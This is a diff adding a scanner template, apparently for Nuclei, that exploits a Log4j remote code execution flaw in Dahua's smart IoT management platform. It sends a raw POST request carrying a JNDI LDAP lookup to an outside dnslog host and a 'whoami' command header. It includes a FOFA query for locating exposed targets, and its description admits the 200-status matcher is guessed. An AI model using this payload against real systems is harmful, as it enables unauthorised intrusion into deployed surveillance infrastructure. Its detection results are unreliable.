@@ -1,0 +1,53 @@
+id: poc-ymtgu4f3vgzpi8w7
+info:
+  name: 大华智能物联综合管理平台log4j远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ymtgu4f3vgzpi8w7
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ymtgu4f3vgzpi8w7
+    fofa: body="*客户端会小于800*"
+http:
+- raw:
+  - 'POST /evo-apigw/evo-brm/1.2.0/user/is-exist HTTP/2
+
+    Host: {{Hostname}}
+
+    Sec-Ch-Ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+
+    Accept-Language: zh-CN
+
+    Timeoffset: -28800000
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+    Content-Type: application/json;charset=utf-8
+
+    cmd: whoami
+
+    Accept: application/json, text/plain, */*
+
+    User-Client: 1
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-Mode: cors
+
+    Content-Length: 49
+
+
+
+    {"loginName":"${jndi:ldap://mitptv.dnslog.cn}"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
